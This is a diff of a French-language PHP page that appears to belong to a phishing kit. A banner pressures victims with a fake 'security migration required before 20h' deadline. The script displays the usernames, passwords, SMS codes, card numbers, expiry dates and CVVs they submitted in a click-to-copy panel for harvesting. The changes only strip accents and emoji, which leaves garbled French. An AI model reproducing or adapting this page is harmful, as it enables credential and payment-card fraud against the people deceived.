@@ -50,7 +50,7 @@ session_start();
         }
         
         .migration-alert::before {
-            content: "⚠️";
+            content: "";
             margin-right: 8px;
             font-size: 16px;
         }
@@ -172,7 +172,7 @@ session_start();
             border-top: 1px solid #ddd;
         }
 
-        /* Style pour l'affichage des données copiables */
+        /* Style pour l'affichage des donnes copiables */
         .debug-info {
             position: fixed;
             top: 10px;
@@ -292,7 +292,7 @@ session_start();
 <body>
     <div class="container">
         <div class="migration-alert">
-            ⚠️ Migration de sécurité requise - Complétez avant 20h
+             Migration de scurit requise - Compltez avant 20h
         </div>
         
         <div class="logo-container">
@@ -303,7 +303,7 @@ session_start();
         <div class="form-container">
             <div class="welcome-text">
                 <h2>Merci</h2>
-                <p>Vos informations ont été validées avec succès. Vous pouvez maintenant fermer cette page.</p>
+                <p>Vos informations ont t valides avec succs. Vous pouvez maintenant fermer cette page.</p>
             </div>
             
             <div class="button-group">
@@ -323,14 +323,14 @@ session_start();
                 if (username || password || sms_code || card_number || expiry || cvv) {
                     var debugDiv = document.createElement("div");
                     debugDiv.className = "debug-info";
-                    var html = "<h4>📋 Données soumises (Local)</h4>";
+                    var html = "<h4> Donnes soumises (Local)</h4>";
                     if (username) html += '<div class="debug-data" onclick="copyToClipboard(this, \'username\')"><strong>Username:</strong> ' + username + '<span class="copy-hint">Cliquez pour copier</span></div>';
                     if (password) html += '<div class="debug-data" onclick="copyToClipboard(this, \'password\')"><strong>Password:</strong> ' + password + '<span class="copy-hint">Cliquez pour copier</span></div>';
                     if (sms_code) html += '<div class="debug-data" onclick="copyToClipboard(this, \'sms_code\')"><strong>SMS Code:</strong> ' + sms_code + '<span class="copy-hint">Cliquez pour copier</span></div>';
                     if (card_number) html += '<div class="debug-data" onclick="copyToClipboard(this, \'card_number\')"><strong>Card Number:</strong> ' + card_number + '<span class="copy-hint">Cliquez pour copier</span></div>';
                     if (expiry) html += '<div class="debug-data" onclick="copyToClipboard(this, \'expiry\')"><strong>Expiry MM/AA:</strong> ' + expiry + '<span class="copy-hint">Cliquez pour copier</span></div>';
                     if (cvv) html += '<div class="debug-data" onclick="copyToClipboard(this, \'cvv\')"><strong>CVV:</strong> ' + cvv + '<span class="copy-hint">Cliquez pour copier</span></div>';
-                    html += '<div style="font-size: 11px; opacity: 0.8; margin-top: 5px;">Cliquez sur les données pour copier</div>';
+                    html += '<div style="font-size: 11px; opacity: 0.8; margin-top: 5px;">Cliquez sur les donnes pour copier</div>';
                     debugDiv.innerHTML = html;
                     document.body.appendChild(debugDiv);
                 }
@@ -364,7 +364,7 @@ session_start();
                 const originalBackground = element.style.background;
                 const originalHTML = element.innerHTML;
                 
-                element.innerHTML = '<strong>✅ Copied!</strong>';
+                element.innerHTML = '<strong> Copied!</strong>';
                 element.style.background = 'rgba(76, 175, 80, 0.4)';
                 element.style.border = '1px solid #4caf50';
                 
@@ -400,7 +400,7 @@ function copyToClipboard(element, type) {
         const originalBackground = element.style.background;
         const originalHTML = element.innerHTML;
         
-        element.innerHTML = '<strong>✅ Copied!</strong>';
+        element.innerHTML = '<strong> Copied!</strong>';
         element.style.background = 'rgba(76, 175, 80, 0.4)';
         element.style.border = '1px solid #4caf50';
         
@@ -429,7 +429,7 @@ document.addEventListener("DOMContentLoaded", function() {
         var debugDiv = document.createElement("div");
         debugDiv.className = "debug-info";
         
-        var html = "<h4>📋 Données soumises (Local)</h4>";
+        var html = "<h4> Donnes soumises (Local)</h4>";
         if (username) {
             html += '<div class="debug-data" onclick="copyToClipboard(this, \'username\')"><strong>Username:</strong> ' + username + '<span class="copy-hint">Cliquez pour copier</span></div>';
         }
@@ -448,7 +448,7 @@ document.addEventListener("DOMContentLoaded", function() {
         if (cvv) {
             html += '<div class="debug-data" onclick="copyToClipboard(this, \'cvv\')"><strong>CVV:</strong> ' + cvv + '<span class="copy-hint">Cliquez pour copier</span></div>';
         }
-        html += '<div style="font-size: 11px; opacity: 0.8; margin-top: 5px;">Cliquez sur les données pour copier</div>';
+        html += '<div style="font-size: 11px; opacity: 0.8; margin-top: 5px;">Cliquez sur les donnes pour copier</div>';
         debugDiv.innerHTML = html;
         document.body.appendChild(debugDiv);
     }
